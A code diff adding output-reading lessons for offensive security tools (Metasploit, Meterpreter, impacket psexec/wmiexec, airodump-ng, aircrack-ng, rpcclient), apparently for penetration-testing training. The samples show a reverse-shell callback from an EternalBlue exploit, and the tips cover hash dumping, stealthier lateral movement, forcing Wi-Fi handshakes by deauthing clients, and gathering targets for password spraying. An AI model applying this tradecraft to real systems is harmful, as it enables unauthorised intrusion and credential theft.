@@ -38,6 +38,12 @@ _ALIASES = {
     "ps": "tasklist", "ps aux": "tasklist",  # process-list reading (Win/Linux)
     "impacket-getnpusers": "getnpusers", "getnpusers.py": "getnpusers",
     "certipy-ad": "certipy", "certipy.py": "certipy",
+    "msf": "msfconsole", "metasploit": "msfconsole",
+    "meterp": "meterpreter",
+    "impacket-psexec": "psexec", "impacket-wmiexec": "psexec",
+    "impacket-smbexec": "psexec", "wmiexec": "psexec", "smbexec": "psexec",
+    "psexec.py": "psexec", "wmiexec.py": "psexec",
+    "airodump": "airodump-ng", "aircrack": "aircrack-ng",
 }
 
 
@@ -1295,6 +1301,313 @@ OUTPUT_LESSONS.update({
             "[!] ESC1 is a direct path to impersonate any user (incl. DA) — it's an exploit, not a hardening note.",
             "'Enrollee Supplies Subject: True' + 'Client Authentication: True' is the ESC1 combo — one alone isn't it.",
             "'Requires Manager Approval: True' gates the attack — the easy wins are the ones that say False.",
+        ],
+    },
+})
+
+
+# ── Batch 5: post-exploitation — getting and reading a shell ────────────────
+OUTPUT_LESSONS.update({
+
+    "msfconsole": {
+        "tool": "msfconsole (exploit run)",
+        "headline": "Metasploit narrates with markers: [*] status, [+] a step succeeded, [-] failure. But only ONE line means you won — 'session opened'. 'Exploit completed, but no session' is a loss.",
+        "sample": (
+            "[*] Started reverse TCP handler on 10.10.14.5:4444\n"
+            "[*] 10.0.0.5:445 - Connecting to target for exploitation.\n"
+            "[+] 10.0.0.5:445 - Connection established for exploitation.\n"
+            "[+] 10.0.0.5:445 - Target OS selected valid for OS indicated by SMB reply\n"
+            "[*] 10.0.0.5:445 - Sending exploit packet\n"
+            "[+] 10.0.0.5:445 - ETERNALBLUE overwrite completed successfully!\n"
+            "[*] Sending stage (200774 bytes) to 10.0.0.5\n"
+            "[*] Meterpreter session 1 opened (10.10.14.5:4444 -> 10.0.0.5:49158)"
+        ),
+        "reading": [
+            {"field": "[*] Started reverse TCP handler on 10.10.14.5:4444",
+             "means": "YOUR listener is up, waiting for the payload to call back to LHOST:LPORT.",
+             "do": "Confirms the callback address the target must reach. If the target can't reach 10.10.14.5, no session — check routing/VPN."},
+            {"field": "[+] ... overwrite completed successfully!",
+             "means": "The exploit primitive landed — but this is NOT yet a shell.",
+             "do": "Encouraging, but don't celebrate. Wait for the 'session opened' line before assuming access."},
+            {"field": "[*] Meterpreter session 1 opened (LHOST -> TARGET)",
+             "means": "THE win. You have a live session; the arrow shows your listener ← the target's connection back.",
+             "do": "Type `sessions -i 1` to interact. This is the line that matters — everything above was setup."},
+            {"field": "(absent) Exploit completed, but no session was created",
+             "means": "The exploit FIRED but you got nothing — wrong target build, payload blocked, or EDR ate it.",
+             "do": "Treat as failure: re-check target/payload/LHOST, try a different target index or a staged/stageless payload."},
+        ],
+        "reference": {
+            "title": "The markers + the two outcomes",
+            "rows": [
+                ("[*]", "informational status — what MSF is doing"),
+                ("[+]", "a step succeeded (connection, overwrite) — NOT a session"),
+                ("[-]", "an error/failure step"),
+                ("'session N opened'", "SUCCESS — you have a shell"),
+                ("'completed, but no session'", "FAILURE — exploit ran, no access"),
+            ],
+        },
+        "work_with_it": (
+            "Scan for exactly one line: 'session opened'. If it's there, drop into it (sessions -i N). If "
+            "instead you see 'Exploit completed, but no session was created', it's a miss — the most common "
+            "cause is LHOST the target can't reach, or the wrong target build. Green [+] steps are progress, "
+            "not proof; the session line is proof."
+        ),
+        "misreads": [
+            "'Exploit completed, but no session was created' is a FAILURE — the exploit fired and gave you nothing.",
+            "A [+] 'overwrite completed' is not a shell — only the 'session opened' line is.",
+            "No callback usually means LHOST is unreachable from the target (VPN/routing), not that the bug is patched.",
+        ],
+    },
+
+    "meterpreter": {
+        "tool": "meterpreter (post-exploitation)",
+        "headline": "Meterpreter answers 'where am I and what can I do?'. getuid tells you your privilege (SYSTEM = you own it), sysinfo tells you the box, and that dictates every next move.",
+        "sample": (
+            "meterpreter > getuid\n"
+            "Server username: NT AUTHORITY\\SYSTEM\n"
+            "meterpreter > sysinfo\n"
+            "Computer     : WS01\n"
+            "OS           : Windows 10 (10.0 Build 19045)\n"
+            "Architecture : x64\n"
+            "meterpreter > getsystem\n"
+            "...got system via technique 1 (Named Pipe Impersonation)."
+        ),
+        "reading": [
+            {"field": "getuid → NT AUTHORITY\\SYSTEM",
+             "means": "Your privilege level. SYSTEM is the highest local account — you fully own this machine.",
+             "do": "No local privesc needed. Go straight to hashdump / credential theft / lateral movement."},
+            {"field": "getuid → a normal user (CORP\\jdoe)",
+             "means": "You're a limited user — most post-ex actions (hashdump) will fail.",
+             "do": "Escalate FIRST: run getsystem, or a local exploit suggester, before trying to dump anything."},
+            {"field": "sysinfo → OS ... Build 19045, x64",
+             "means": "The exact OS build and architecture.",
+             "do": "Build number = patch level → pick the right kernel exploit; arch (x64) → match your payloads/DLLs."},
+            {"field": "getsystem → got system via technique 1",
+             "means": "You just escalated from admin to SYSTEM.",
+             "do": "Confirm with getuid. Now hashdump and token manipulation are available."},
+        ],
+        "reference": {
+            "title": "Reading your position",
+            "rows": [
+                ("getuid = SYSTEM", "max local privilege — proceed to loot"),
+                ("getuid = user", "escalate before dumping (getsystem / suggester)"),
+                ("sysinfo Build", "patch level → kernel-exploit selection"),
+                ("hashdump", "local SAM hashes (needs SYSTEM)"),
+                ("getsystem failed", "try local exploits / potato attacks"),
+            ],
+        },
+        "work_with_it": (
+            "Always run getuid FIRST — it decides everything. SYSTEM means loot immediately (hashdump, "
+            "lsa secrets, pivot). A normal user means escalate before anything else, or your commands just "
+            "error out. Use sysinfo's build to choose kernel exploits, and remember migrating to a stable "
+            "process protects your session from the exploited process dying."
+        ),
+        "misreads": [
+            "getuid = SYSTEM means you're already at max local privilege — stop looking for privesc, start looting.",
+            "A non-SYSTEM getuid means hashdump will fail — escalate first, don't just retry it.",
+            "sysinfo's Build number is the patch level; it's how you pick a working kernel exploit.",
+        ],
+    },
+
+    "psexec": {
+        "tool": "impacket psexec / wmiexec / smbexec",
+        "headline": "These lateral-movement tools narrate HOW they land a shell. psexec creates a service and drops a binary (loud); wmiexec uses WMI (quiet, no binary). The shell you get is usually SYSTEM.",
+        "sample": (
+            "[*] Requesting shares on 10.0.0.5.....\n"
+            "[*] Found writable share ADMIN$\n"
+            "[*] Uploading file kxwGtMsl.exe\n"
+            "[*] Opening SVCManager on 10.0.0.5.....\n"
+            "[*] Creating service kZlP on 10.0.0.5.....\n"
+            "[*] Starting service kZlP.....\n"
+            "[!] Press help for extra shell commands\n"
+            "C:\\Windows\\system32>"
+        ),
+        "reading": [
+            {"field": "[*] Found writable share ADMIN$",
+             "means": "You have admin-level write access to that share — psexec needs it to drop its binary.",
+             "do": "Confirms admin rights on the target. No writable ADMIN$ → psexec fails; try wmiexec (no share needed)."},
+            {"field": "Uploading file kxwGtMsl.exe + Creating service",
+             "means": "psexec's mechanism: drop a service binary and register a Windows service to run it.",
+             "do": "Know this is LOUD — the service creation logs Event ID 7045, and the binary touches disk (AV can catch it)."},
+            {"field": "C:\\Windows\\system32> prompt",
+             "means": "You have a shell — and via psexec/smbexec it's almost always running as SYSTEM.",
+             "do": "Confirm with `whoami` (expect nt authority\\system). You're now executing on the target."},
+            {"field": "(wmiexec instead) no upload, no service",
+             "means": "wmiexec runs commands over WMI with no binary drop and no service — much quieter.",
+             "do": "Prefer wmiexec/atexec when stealth matters; psexec/smbexec when you need a full SYSTEM shell and don't mind noise."},
+        ],
+        "reference": {
+            "title": "Which exec method, and how loud",
+            "rows": [
+                ("psexec", "service + binary drop → SYSTEM shell, LOUD (7045)"),
+                ("smbexec", "service, no binary → semi-interactive, loud-ish"),
+                ("wmiexec", "WMI, no binary, no service → quieter"),
+                ("atexec", "scheduled task → runs one command, quiet-ish"),
+                ("writable ADMIN$", "confirms admin rights on the target"),
+            ],
+        },
+        "work_with_it": (
+            "Match the method to your goal: need a full interactive SYSTEM shell and noise is fine → psexec. "
+            "Need stealth → wmiexec (no binary, no service, no 7045). 'Found writable share' is your proof of "
+            "admin on the box. Whatever lands, run whoami first to confirm the context, then enumerate or pivot."
+        ),
+        "misreads": [
+            "psexec is LOUD — it creates a service (Event 7045) and drops a binary AV can flag; wmiexec is the quiet option.",
+            "'Found writable share ADMIN$' confirms you already have admin rights there — that's why it works.",
+            "The shell is usually SYSTEM, but confirm with whoami — don't assume your privilege level.",
+        ],
+    },
+})
+
+
+# ── Batch 5b: wireless recon/crack + RPC enumeration ───────────────────────
+OUTPUT_LESSONS.update({
+
+    "airodump-ng": {
+        "tool": "airodump-ng",
+        "headline": "airodump-ng is a live radio survey. Read PWR for distance (negative dBm, closer to 0 = nearer), ENC for the attack, and the STATION list for clients you can deauth to force a handshake.",
+        "sample": (
+            " BSSID              PWR  Beacons  #Data  CH  MB   ENC  CIPHER AUTH ESSID\n"
+            " AA:BB:CC:11:22:33  -42     120     340   6  270  WPA2 CCMP   PSK  HomeNet\n"
+            " AA:BB:CC:44:55:66  -78      45       2  11  130  WPA2 CCMP   PSK  Corp-WiFi\n"
+            "\n"
+            " BSSID              STATION            PWR   Rate    Frames\n"
+            " AA:BB:CC:11:22:33  DE:AD:BE:EF:00:11  -50   1e-1e   210"
+        ),
+        "reading": [
+            {"field": "PWR  -42  vs  -78",
+             "means": "Signal strength in dBm (negative). Closer to 0 = STRONGER/nearer. -42 is close, -78 is far/weak.",
+             "do": "Target the strong ones — you need a solid signal to capture a clean handshake and to deauth reliably."},
+            {"field": "CH 6",
+             "means": "The channel the AP is on.",
+             "do": "Lock airodump to it: --channel 6. If you keep hopping channels you'll miss the handshake."},
+            {"field": "ENC/CIPHER/AUTH = WPA2/CCMP/PSK",
+             "means": "The security. WPA2-PSK = capture-a-handshake-and-crack. WEP = trivial. OPN = open, no crack needed.",
+             "do": "For WPA2-PSK: capture the 4-way handshake (-w to a file), then crack offline with aircrack/hashcat."},
+            {"field": "STATION  DE:AD:BE:EF:00:11 (under a BSSID)",
+             "means": "A CLIENT currently connected to that AP.",
+             "do": "This is your deauth target — knock it off (aireplay-ng --deauth) to force it to reconnect and capture the handshake."},
+        ],
+        "reference": {
+            "title": "The columns that drive the attack",
+            "rows": [
+                ("PWR (negative dBm)", "closer to 0 = stronger/nearer target"),
+                ("CH", "channel — lock to it with --channel"),
+                ("#Data climbing", "active traffic — good for capture"),
+                ("ENC (WPA2/WEP/OPN)", "picks the attack (handshake / trivial / none)"),
+                ("STATION rows", "connected clients — your deauth targets"),
+            ],
+        },
+        "work_with_it": (
+            "Pick a strong (PWR near 0), WPA2-PSK target with at least one STATION, lock to its CH, and "
+            "capture to a file (-w). Deauth a listed client to force the 4-way handshake, watch the top-right "
+            "for 'WPA handshake: <BSSID>', then take the .cap offline to aircrack/hashcat. No clients = no "
+            "easy handshake; find an AP with active stations."
+        ),
+        "misreads": [
+            "PWR is negative dBm — -42 is a STRONG/close signal, -78 is weak/far. Closer to 0 wins.",
+            "You need a connected STATION to deauth for a WPA handshake — an AP with no clients is much harder.",
+            "Lock to the target channel (--channel) — channel-hopping means you'll miss the handshake capture.",
+        ],
+    },
+
+    "aircrack-ng": {
+        "tool": "aircrack-ng",
+        "headline": "aircrack-ng first tells you whether your capture is even usable: '(1 handshake)' means crackable, '(0 handshakes)' means go re-capture. Then it's a dictionary race to 'KEY FOUND!'.",
+        "sample": (
+            "Opening capture.cap\n"
+            "Read 4521 packets.\n"
+            "   #  BSSID              ESSID       Encryption\n"
+            "   1  AA:BB:CC:11:22:33  HomeNet     WPA (1 handshake)\n"
+            "Choosing first network as target.\n"
+            "\n"
+            "      [00:02:14] 1823/9999 keys tested (13.5 k/s)\n"
+            "      KEY FOUND! [ Summer2024! ]"
+        ),
+        "reading": [
+            {"field": "WPA (1 handshake)",
+             "means": "Your capture CONTAINS a valid 4-way handshake — the prerequisite to crack.",
+             "do": "Good to go. If it read '(0 handshakes)', stop — your capture is useless; go back and capture one (deauth a client)."},
+            {"field": "keys tested (13.5 k/s)",
+             "means": "Your cracking rate. WPA is deliberately slow to brute (PBKDF2).",
+             "do": "For real speed, convert to hashcat -m 22000 on a GPU — CPU aircrack is fine for small lists only."},
+            {"field": "KEY FOUND! [ Summer2024! ]",
+             "means": "The Wi-Fi PSK — the network password.",
+             "do": "You're on the network. Connect, then treat it as an internal foothold (scan, pivot)."},
+            {"field": "(instead) Passphrase not in dictionary",
+             "means": "Your wordlist didn't contain the password. The handshake is fine; the list wasn't.",
+             "do": "Not uncrackable — try a bigger/targeted list (rockyou, or ESSID-themed) or rules. WPA-PSK is dictionary-only."},
+        ],
+        "reference": {
+            "title": "Two checkpoints",
+            "rows": [
+                ("(1 handshake)", "capture is valid — crack can proceed"),
+                ("(0 handshakes)", "capture unusable — re-capture (deauth a client)"),
+                ("keys tested k/s", "your rate — move to hashcat -m 22000 for GPU speed"),
+                ("KEY FOUND!", "the PSK — you're on the network"),
+                ("not in dictionary", "wrong wordlist, not uncrackable — try a better one"),
+            ],
+        },
+        "work_with_it": (
+            "Read the handshake count FIRST — no handshake, no crack, full stop. With a valid capture, aircrack "
+            "on CPU is only for tiny lists; convert the .cap/.pcapng to hashcat -m 22000 and crack on a GPU for "
+            "real throughput. A found PSK is an internal foothold — connect and pivot like any other network."
+        ),
+        "misreads": [
+            "'(0 handshakes)' means your capture is worthless — you must capture a handshake before cracking.",
+            "aircrack only tests YOUR wordlist — 'not in dictionary' means try a better list, not that it's uncrackable.",
+            "WPA/WPA2-PSK is dictionary-only (no WEP-style shortcut) — success depends entirely on your wordlist.",
+        ],
+    },
+
+    "rpcclient": {
+        "tool": "rpcclient",
+        "headline": "rpcclient talks MS-RPC to a target — and with a null session it enumerates the domain without creds. The gold: user lists (enumdomusers), hidden passwords (querydispinfo), and the password policy.",
+        "sample": (
+            "rpcclient $> enumdomusers\n"
+            "user:[Administrator] rid:[0x1f4]\n"
+            "user:[jdoe] rid:[0x44f]\n"
+            "user:[svc_sql] rid:[0x450]\n"
+            "rpcclient $> querydispinfo\n"
+            "Name: John Doe  Desc: (temp pw Welcome1!)  RID: 0x44f\n"
+            "rpcclient $> getdompwinfo\n"
+            "min_password_length: 7\n"
+            "password_properties: 0x00000000"
+        ),
+        "reading": [
+            {"field": "enumdomusers → user:[...] rid:[0x...]",
+             "means": "The domain user list with RIDs. 0x1f4 = 500 = Administrator; 0x44f+ = created users.",
+             "do": "Harvest every username into a list (convert hex RIDs if needed). If a null session got you here, you had NO creds."},
+            {"field": "querydispinfo → Desc: (temp pw Welcome1!)",
+             "means": "User descriptions — and admins hide passwords in them, just like LDAP description fields.",
+             "do": "READ every Desc. Cleartext creds here are a free foothold — a classic, still-common finding."},
+            {"field": "getdompwinfo → min_password_length: 7",
+             "means": "The domain password policy (min length, complexity, lockout).",
+             "do": "Sets your spray parameters — short minimum + weak complexity = spray-friendly."},
+            {"field": "password_properties: 0x00000000",
+             "means": "The complexity bitmask. 0x0 = NO complexity requirement enforced.",
+             "do": "Weak-password heaven. 0x1 would mean complexity ON. Combine with lockout info before spraying."},
+        ],
+        "reference": {
+            "title": "The commands worth running",
+            "rows": [
+                ("enumdomusers", "domain user list + RIDs (feed your spray list)"),
+                ("querydispinfo", "user descriptions — hunt hidden passwords"),
+                ("getdompwinfo", "password policy — sets spray parameters"),
+                ("queryuser <rid>", "detail on one account (last logon, flags)"),
+                ("null session (-U '' -N)", "all of the above with NO credentials"),
+            ],
+        },
+        "work_with_it": (
+            "Try a null session first (-U '' -N) — if it works, you enumerate users, descriptions, and policy "
+            "for free. Build a username list from enumdomusers, scrape querydispinfo Desc fields for plaintext "
+            "creds, and read getdompwinfo to set safe spray parameters (stay under the lockout threshold). "
+            "It's the no-creds AD-enum workhorse alongside enum4linux."
+        ),
+        "misreads": [
+            "rpcclient with '-U \"\" -N' enumerates the domain with NO credentials when null sessions are allowed.",
+            "querydispinfo Desc fields routinely hold cleartext passwords — read them like LDAP descriptions.",
+            "password_properties 0x0 means complexity is OFF (spray-friendly); 0x1 means it's enforced.",
         ],
     },
 })
